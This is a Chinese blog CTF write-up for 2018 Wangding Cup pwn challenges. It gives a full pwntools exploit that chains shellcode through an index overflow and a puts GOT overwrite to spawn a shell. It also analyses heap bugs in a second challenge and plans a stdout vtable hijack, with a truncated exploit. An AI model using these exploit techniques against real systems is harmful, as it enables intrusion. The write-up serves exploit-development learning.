<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>2018ç½‘é¼æ¯ | é£äº‘é˜</title>
  <meta name="keywords" content=" Pwn , CTF ">
  <meta name="description" content="2018ç½‘é¼æ¯ | é£äº‘é˜">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="çº¢å®çŸ³ğŸ¬ ğŸ“’ æ•°å­—è¿ç®—ç¬¦ä¼˜å…ˆçº§  ğŸ“’ å–ä½™åªè¿”å›æ­£æ•°  puts (5 % 3)     # prints  2   puts (-5 % 3)    # prints  1   puts (5 % -3)    # prints -1   puts (-5 % -3)   # prints -2   ğŸ¬ é€»è¾‘æˆ–è¿”å›å€¼å–å†³äºç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œè¿”å›ç¬¬ä¸€ä¸ªæ“ä½œæ•°å¦‚æœå…¶ä¸ºéå‡ï¼Œå¦åˆ™è¿”å›ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="çº¢å®çŸ³å­¦ä¹ ç¬”è®°">
<meta property="og:url" content="https://primelyw.github.io/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="é£äº‘é˜">
<meta property="og:description" content="çº¢å®çŸ³ğŸ¬ ğŸ“’ æ•°å­—è¿ç®—ç¬¦ä¼˜å…ˆçº§  ğŸ“’ å–ä½™åªè¿”å›æ­£æ•°  puts (5 % 3)     # prints  2   puts (-5 % 3)    # prints  1   puts (5 % -3)    # prints -1   puts (-5 % -3)   # prints -2   ğŸ¬ é€»è¾‘æˆ–è¿”å›å€¼å–å†³äºç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œè¿”å›ç¬¬ä¸€ä¸ªæ“ä½œæ•°å¦‚æœå…¶ä¸ºéå‡ï¼Œå¦åˆ™è¿”å›ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚">
<meta property="og:image" content="https://primelyw.github.io/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200422173243739.png">
<meta property="article:published_time" content="2020-04-21T12:18:56.368Z">
<meta property="article:modified_time" content="2020-04-22T16:29:29.169Z">
<meta property="article:author" content="æ«äº‘æ">
<meta property="article:tag" content="ruby">
<meta property="article:tag" content="lang">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://primelyw.github.io/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200422173243739.png">


<link rel="icon" href="/img/avatar2.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/github.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.0.1" ></script>

<meta name="generator" content="Hexo 4.2.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value="">
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar2.jpg" />
</a>
<div class="author">
    <span>æ«äº‘æ</span>
</div>

<div class="icon">
    
</div>



<a class="more-menus">æ›´å¤šèœå•</a>


<ul>
    <li><div class="all active">å…¨éƒ¨æ–‡ç« </div></li>
    
        
            <li><div data-rel="CTF">CTF</div></li>
        
    
        
            <li><div data-rel="Fuzz">Fuzz</div></li>
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/">å…³äº</a><a style="width: 50%"  class="friends">å‹é“¾</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="23">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        å‹æƒ…é“¾æ¥
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://blog.plusls.com/">å¸ˆçˆ¶</a></li>
            
            <li><a target="_blank" href="https://blog.xhyh.best/">æ½‡æ™—å®‡æµ©</a></li>
            
            <li><a target="_blank" href="http://pzhxbz.cn/">pzhxbz</a></li>
            
            <li><a target="_blank" href="https://evi0s.com/">evi0s</a></li>
            
            <li><a target="_blank" href="https://enivs0rt.github.io/">enivS0rt</a></li>
            
            <li><a target="_blank" href="http://sup3rgate.xyz/">SuperGate</a></li>
            
            <li><a target="_blank" href="https://ccdragon.cc/">ccdragon</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode === 13){return false;}">
        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">Pwn</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CTF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">CVE</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">fuzz</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">afl</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">Defcon</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">ruby</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">lang</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <nav id="title-list-nav">
        
        <a  class=""
           href="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="æ•°å­—ä¸­å›½è™ç¬¦ç½‘å®‰å¤§èµ›2020">æ•°å­—ä¸­å›½è™ç¬¦ç½‘å®‰å¤§èµ›2020</span>
            <span class="post-date" title="2020-04-23 12:50:42">2020/04/23</span>
        </a>
        
        <a  class=""
           href="/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="ruby,lang"
           data-author="" >
            <span class="post-title" title="çº¢å®çŸ³å­¦ä¹ ç¬”è®°">çº¢å®çŸ³å­¦ä¹ ç¬”è®°</span>
            <span class="post-date" title="2020-04-21 20:18:56">2020/04/21</span>
        </a>
        
        <a  class="CTF "
           href="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="2018ç½‘é¼æ¯">2018ç½‘é¼æ¯</span>
            <span class="post-date" title="2020-04-15 00:00:00">2020/04/15</span>
        </a>
        
        <a  class="Fuzz "
           href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/"
           data-tag="fuzz,afl"
           data-author="" >
            <span class="post-title" title="AFLåŸºç¡€">AFLåŸºç¡€</span>
            <span class="post-date" title="2020-04-10 12:35:49">2020/04/10</span>
        </a>
        
        <a  class=""
           href="/2020/04/05/CVEs/"
           data-tag="Pwn,CVE"
           data-author="" >
            <span class="post-title" title="CVEs">CVEs</span>
            <span class="post-date" title="2020-04-05 20:45:40">2020/04/05</span>
        </a>
        
        <a  class="CTF "
           href="/2020/02/10/NullConCTF2020/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="NullConCTF2020">NullConCTF2020</span>
            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
        </a>
        
        <a  class="CTF "
           href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="å¼ºç½‘æ¯2019">å¼ºç½‘æ¯2019</span>
            <span class="post-date" title="2020-01-16 02:06:12">2020/01/16</span>
        </a>
        
        <a  class="CTF "
           href="/2019/11/30/N1CTF2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="N1CTF2019">N1CTF2019</span>
            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
        </a>
        
        <a  class="CTF "
           href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="å®‰æ´µæ¯2019">å®‰æ´µæ¯2019</span>
            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/2019/11/07/Advance-rop/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Advance-rop">Advance-rop</span>
            <span class="post-date" title="2019-11-07 09:50:48">2019/11/07</span>
        </a>
        
        <a  class=""
           href="/2019/10/20/heap_details/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="heap_details">heap_details</span>
            <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
        </a>
        
        <a  class="CTF "
           href="/2019/10/12/RoarCTF-2019/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="RoarCTF-2019">RoarCTF-2019</span>
            <span class="post-date" title="2019-10-12 00:00:00">2019/10/12</span>
        </a>
        
        <a  class=""
           href="/2019/07/22/Pwner/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="pwner">pwner</span>
            <span class="post-date" title="2019-07-22 00:00:00">2019/07/22</span>
        </a>
        
        <a  class=""
           href="/2019/07/18/tmux/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="tmux">tmux</span>
            <span class="post-date" title="2019-07-18 00:00:00">2019/07/18</span>
        </a>
        
        <a  class=""
           href="/2019/07/11/server_misc/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="server_misc">server_misc</span>
            <span class="post-date" title="2019-07-11 00:00:00">2019/07/11</span>
        </a>
        
        <a  class=""
           href="/2019/07/07/git_handbook/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="git handbook">git handbook</span>
            <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
        </a>
        
        <a  class=""
           href="/2019/05/26/assembly/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="assembly">assembly</span>
            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
        </a>
        
        <a  class=""
           href="/2019/05/10/pwning/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="pwning">pwning</span>
            <span class="post-date" title="2019-05-10 00:00:00">2019/05/10</span>
        </a>
        
        <a  class=""
           href="/2019/05/01/finance/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="finance">finance</span>
            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
        </a>
        
        <a  class="CTF "
           href="/2019/05/01/Defcon2019Q/"
           data-tag="Pwn,CTF,Defcon"
           data-author="" >
            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
        </a>
        
        <a  class=""
           href="/2019/04/30/shellcode/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="shellcode">shellcode</span>
            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
        </a>
        
        <a  class=""
           href="/2019/04/30/elf_protector/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="elf_protector">elf_protector</span>
            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
        </a>
        
        <a  class="CTF "
           href="/2019/04/29/StarCTF/"
           data-tag="Pwn,CTF"
           data-author="" >
            <span class="post-title" title="StarCTF">StarCTF</span>
            <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-2018ç½‘é¼æ¯" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">2018ç½‘é¼æ¯</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            
                <a  data-rel="CTF">CTF</a>
            
        </span>
        
        
        <span class="tag">
            
            <a class="color4">Pwn</a>
            
            <a class="color4">CTF</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        åˆ›å»ºæ—¶é—´:<time class="date" title='æ›´æ–°æ—¶é—´: 2020-04-21 22:11:24'>2020-04-15 00:00</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            é˜…è¯»:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2018ç½‘é¼æ¯"><span class="toc-text">2018ç½‘é¼æ¯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note2"><span class="toc-text">note2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soEasy"><span class="toc-text">soEasy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pesp"><span class="toc-text">pesp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Revrese"><span class="toc-text">Revrese</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-like-pack"><span class="toc-text">i_like_pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre"><span class="toc-text">babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleSMC"><span class="toc-text">SimpleSMC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ç½‘é¼æ¯REè€ƒç‚¹"><span class="toc-text">ç½‘é¼æ¯REè€ƒç‚¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#é€†å‘ä¾‹é¢˜"><span class="toc-text">é€†å‘ä¾‹é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#çŸ¥è¯†ç‚¹"><span class="toc-text">çŸ¥è¯†ç‚¹</span></a></li></ol></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="2018ç½‘é¼æ¯"><a href="#2018ç½‘é¼æ¯" class="headerlink" title="2018ç½‘é¼æ¯"></a>2018ç½‘é¼æ¯</h1><p>[toc]</p>
<p><div class='inner-toc'><h2>ç›®å½•</h2><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2018ç½‘é¼æ¯"><span class="toc-text">2018ç½‘é¼æ¯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#note"><span class="toc-text">note</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note2"><span class="toc-text">note2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soEasy"><span class="toc-text">soEasy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pesp"><span class="toc-text">pesp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Revrese"><span class="toc-text">Revrese</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-like-pack"><span class="toc-text">i_like_pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre"><span class="toc-text">babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleSMC"><span class="toc-text">SimpleSMC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ç½‘é¼æ¯REè€ƒç‚¹"><span class="toc-text">ç½‘é¼æ¯REè€ƒç‚¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#é€†å‘ä¾‹é¢˜"><span class="toc-text">é€†å‘ä¾‹é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#çŸ¥è¯†ç‚¹"><span class="toc-text">çŸ¥è¯†ç‚¹</span></a></li></ol></li></ol></li></ol></div></p>
<p>ä»Šå¹´ç½‘é¼æ¯5æœˆ10æ—¥å¼€èµ›ã€‚ç¬¬ä¸€å±Šåœ¨å‰å¹´ä¸¾åŠï¼Œå‚èµ›é˜Ÿä¼ä¼—å¤šï¼Œå ªç§°ç½‘ç»œå®‰å…¨â€å¥¥è¿ä¼šâ€œã€‚è°·æ­Œäº†ä¸€åœˆï¼Œç¬¬ä¸‰åœºçš„ Pwn Writeup ä¸é½å…¨ã€‚ç¬¬ä¸‰åœºæœ‰4é“é¢˜ç›®ã€‚æœ‰ä¸¤é“é¢˜ç›®æ¯”è¾ƒæœ‰è¶£ï¼Œå†™ä¸€ç¯‡åšæ–‡è®°å½•å¿ƒå¾—ã€‚ </p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>ä¸‹æ ‡æº¢å‡º+æ”¹puts_got+å†™shellcodeã€‚</p>
<pre><code class="python">from pwn import  * 
import primedbg
context.log_level=&#39;debug&#39;
io=process(&#39;./deathnote&#39;)
if len(sys.argv)&gt;1 and sys.argv[1]==&#39;dbg&#39;:
    primedbg.p_attach_dbg(io,[0x00011E9])
def cmd(idx):
    global io; io.sendlineafter(&#39;hoice&gt;&gt;&#39;,str(idx))

def add(idx,sz,c):
    global io; cmd(1)
    io.sendlineafter(&#39;Page:&#39;,str(idx))
    io.sendlineafter(&#39;Size:&#39;,str(sz))
    io.recvuntil(&#39;Name:&#39;)
    io.send(c)

def show(idx):
    global io; cmd(3)
    io.sendlineafter(&#39;Page:&#39;,str(idx)   )

def free(idx):
    global io; cmd(2)
    io.sendlineafter(&#39;Page:&#39;,str(idx))

io.sendlineafter(&#39; me your name:&#39;,&#39;/bin/sh\x00&#39;)
sc1=asm(&#39;xor eax, eax&#39;) + &#39;\xeb\x1c&#39; # jmp 0x20
sc2=asm(&#39;mov al, 0x3b&#39;) + &#39;\xeb\x1c&#39; # jmp 0x20
sc3=asm(&#39;syscall;ret&#39;) + &#39;\x00&#39; 
sc4=asm(&#39;xor edx, edx&#39;)+&#39;\xeb\x9c&#39; # jmp -0x60 (jmp back to sc1)

add(0,4,sc1)
add(0,4,sc2)
add(0,4,sc3)
add(0x100000000-25,4,sc4) #puts_got
#primedbg.p_attach_dbg(p,[0x0001238],{&#39;page&#39;:0x2020E0})
show(0x100000000 - 4)


io.interactive()
</code></pre>
<h3 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h3><p><strong>åˆ†æç¨‹åº</strong></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415105527230.png" alt="ä¿æŠ¤æœºåˆ¶"></p>
<p>ä¿æŠ¤é€‰é¡¹å…¨éƒ¨å¼€å¯ã€‚ </p>
<p>RELROç­‰çº§ä¸ºFULLï¼ŒGOTè¡¨åŠ«æŒä¸å¯è¡Œã€‚ FORTIFY å¼€å¯ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¼˜åŒ–äº†ã€‚</p>
<p>PIE å¼€å¯ï¼ŒELFåœ¨å†…å­˜ä¸­çš„åœ°å€éšæœºäº†ã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415110504350.png" alt="è¿è¡Œç¨‹åº"></p>
<p>é¢˜ç›®è¾“å‡ºå†…å®¹å’Œç¬¬ä¸€é¢˜ deathnote å·®ä¸å¤šã€‚ Write Delete Exit ä¸‰ä¸ªåŠŸèƒ½ã€‚ </p>
<p>IDA é™æ€åˆ†æä¸€ç•ªåï¼Œæˆ‘å‘ç°ä½œè€…åœ¨å †ç®¡ç†ç›¸æ¯”äºç¬¬ä¸€ç‰ˆçš„ç®¡ç†æœºåˆ¶å¢åŠ äº†ä¸€äº›ç‰¹ç‚¹ï¼Œå®‰å…¨æ€§æé«˜ã€‚ä½†æ¯•ç«Ÿä½çº§çš„ å †ç®¡ç†è¿˜æ˜¯å¾ˆè„†å¼±çš„ã€‚ ä»¥å‰åˆ†æè¿‡ glibc çš„å †ç®¡ç†æºç çš„äººéƒ½æ™“å¾—ï¼Œä»£ç é‡å·¨å¤šã€å †å—æ£€æŸ¥å¤šæ ·ã€æ•°æ®ç»“æ„è®¾è®¡çš„ç²¾å·§ã€‚ è¿™é“é¢˜ç›®å †ç®¡ç†çš„æœºåˆ¶ç¡®å®æ¯”glibcçš„ä½çº§å¾ˆå¤šã€‚ å¥½äº†ï¼Œä¸è¯´è¿™ä¹ˆå¤šå£æ°´è¯äº†ï¼Œé€†å‘åˆ†æå®¡è®¡é€»è¾‘ã€‚</p>
<p>low_malloc_func åˆ†æã€‚ </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415111251913.png" alt="low_malloc_func-1"></p>
<p> å†…å­˜å—å°äº0x70å­—èŠ‚çš„ç”³è¯·ä» xmmword_202120 é“¾è¡¨ä¸­è·å¾—ã€‚è¿™ä¸ªé“¾è¡¨æ˜¯ä¸€ä¸ªä½çº§ç‰ˆæœ¬çš„fastbinã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415111522133.png" alt="low_malloc_func-2"></p>
<p>ç”³è¯·ç©ºé—´å¤§äº0x70çš„ä»å¦ä¸€ä¸ªç©ºé—²binä¸­è·å¾—ï¼Œè¿™é‡Œæ¨¡æ‹Ÿäº†glibc unsortedbinï¼Œæˆ‘éšæ‰‹å‘½åæˆ largebin äº†ã€‚è¿™é‡Œçš„binæ˜¯å•é“¾è¡¨ï¼Œé‡åˆ°è¶³å¤Ÿå¤§çš„å†…å­˜å—å°±å–ä¸‹æ¥ã€‚ æ³¨æ„æœ€åä¸€è¡Œï¼Œszie å­—æ®µæœ€ä½ä½æ²¡æœ‰ç½®1ä»¥ç¤ºå ç”¨ã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112027183.png" alt="low_malloc_func-3"></p>
<p>ä¸¤ä¸ªbinéƒ½æ²¡æœ‰åˆ™ä» topchunk ä¸­è·å¾—ã€‚</p>
<p>æ¥ä¸‹æ¥åˆ†æ low_free_funcã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112214299.png" alt="low_free_func-1"></p>
<p>å°å—æ”¾å…¥fastbin</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112255131.png" alt="low_free_func-2"></p>
<p>ç›¸é‚»ä¸‹ä¸€ä¸ªchunkæ­£å¥½æ˜¯topæ—¶ï¼Œå½“å‰chunkå’Œtopåˆå¹¶ã€‚æœ«ä½æ¸…é›¶ã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112413083.png" alt="low_free_func-3"></p>
<p>ç›¸é‚»ä¸‹ä¸€ä¸ªchunkä¸ä¸ºtopä¸”å ç”¨æ—¶ï¼Œç›´æ¥æ”¾å…¥largebin</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415112500837.png" alt="image-20200415112500837"></p>
<p>ç›¸é‚»ä¸‹ä¸€ä¸ªchunkä¸ä¸ºtopä¸”ä¸ºå ç”¨ï¼Œåˆå¹¶ã€‚</p>
<p><strong>æ¼æ´åˆ†æ</strong></p>
<p>æ–¹æ‰è¯´åˆ° low_malloc å‡½æ•°æœ‰ä¸€å¤„åˆ†é…çš„ chunk æ²¡æœ‰æ ‡è®°å ç”¨ï¼Œæ­¤ä¸ºæ¼æ´ç‚¹ä¸€ã€‚ æ¼æ´ç‚¹äºŒåœ¨äº low_free å‡½æ•°åˆå¹¶ç›¸é‚»ä¸‹ä¸€ä¸ªchunkæ—¶æœª unlink å¯¹åº”çš„ chunkã€‚è¿™é‡Œæˆ‘åˆ©ç”¨æ¼æ´ç‚¹äºŒè¿›è¡Œæ”»å‡»</p>
<p><strong>æ”»å‡»æ€è·¯</strong></p>
<ul>
<li><input disabled type="checkbox"> æ¼æ´ç‚¹äºŒé€ æˆUAFã€ç¯¡æ”¹ fd å­—æ®µã€‚</li>
<li><input disabled type="checkbox"> ç”±äºå †ç®¡ç†æœºåˆ¶ä½çº§ï¼Œæœªåšæœ‰æ•ˆæ£€æŸ¥ï¼Œå®ç°ä»»æ„åœ°å€åˆ†é…ã€‚</li>
<li><input disabled type="checkbox"> ä»»æ„åœ°å€è¯»å†™ã€‚</li>
</ul>
<p>ç¨‹åºå¼€äº†PIEï¼Œå †ç®¡ç†çš„å†…å­˜å—æ²¡æœ‰æŒ‡å‘ ELF çš„ç¬¦å·æˆ– libc çš„ç¬¦å·ã€‚è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/A36095D72B8EB2F5E57AADAAB011A196.jpg" alt="vmmap"></p>
<p>mmap è¿”å›çš„å†…å­˜åœ°å€ä¸ libc.so çš„åŸºåœ°å€æ˜¯ä¸€ä¸ªå›ºå®šå€¼ã€‚</p>
<p>è¿™æ ·é€šè¿‡æ³„éœ² chunk çš„ fdï¼Œæ¥ç¡®å®šåŸºåœ°å€ã€‚è¿™æ ·ä¸€æ¥å°±ç¡®å®šäº† one_gadgets å’Œ _IO_2_1_stdout ã€‚</p>
<p>GOTè¡¨åŠ«æŒè¡Œä¸é€šï¼Œæ²¡æœ‰hookå¯å†™ã€‚IO_FILE æœ‰ä¸€å¤„ vtable å‡½æ•°è¡¨ï¼Œå¯ä»¥ç¯¡æ”¹ã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415113625535.png" alt="rw-p é¡µå¯å†™"></p>
<p><strong>åˆ†æ puts å‡½æ•°</strong> </p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415113806831.png" alt="ioputs.c"></p>
<p>æ ¹æ®é€»è¾‘çŸ­è·¯ï¼Œç›´æ¥è·³è¿› _IO_sputn() ã€‚ ï¼ˆæ¨èç”¨ vs code æŸ¥çœ‹æºç ã€‚</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415113930530.png" alt></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415113949168.png" alt></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415114013078.png" alt></p>
<p>å¥½äº†ï¼Œæ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œç›´æ¥è¡ŒåŠ¨ï¼</p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415114044935.png" alt="_IO_jump_t"></p>
<p>__xsputn åç§»8ä¸ªæŒ‡é’ˆã€‚ä¼ªé€ å°±å®Œäº‹äº†ã€‚</p>
<p><strong>Pwned!</strong></p>
<p><img src="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/image-20200415114244732.png" alt></p>
<p><strong>exp</strong></p>
<pre><code class="python">from pwn import * 
from primedbg import * 
import sys
p=process(&#39;./deathnote2_new&#39;)
context.arch=&#39;amd64&#39;

fastbin=0x00202120
largebin=0x000202168

def cmd(i):
    global p; p.sendlineafter(&#39;choice&gt;&gt;&#39;,str(i))

def add(sz,c):
    global p; cmd(1)
    p.sendlineafter(&#39;Size:&#39;,str(sz))
    p.sendafter(&quot;Name:&quot;,c)

def free(i):
    global p; cmd(2)
    p.sendlineafter(&#39;Page:&#39;,str(i))

def show(i):
    global p; cmd(3)
    p.sendlineafter(&#39;Page:&#39;,str(i))
# brk points #show 0x001190 ; #add ret 0x0E7B
if len(sys.argv)&gt;1:
    attach_dbg_pie(p,[0x0001190 ],{&#39;list&#39;:0x0202060,&#39;fastbin&#39;:fastbin,&#39;largebin&#39;:largebin})


#pause()
p.sendline(&#39;/bin/sh&#39;)
add(0x20,&#39;#0\n&#39;)
add(0x80,&#39;#1\n&#39;)
add(0x20,&#39;#2\n&#39;)
add(0x20,&#39;#3\n&#39;)
add(0x20,&#39;#4\n&#39;)

free(3)
free(2)
free(1)
#show(0)
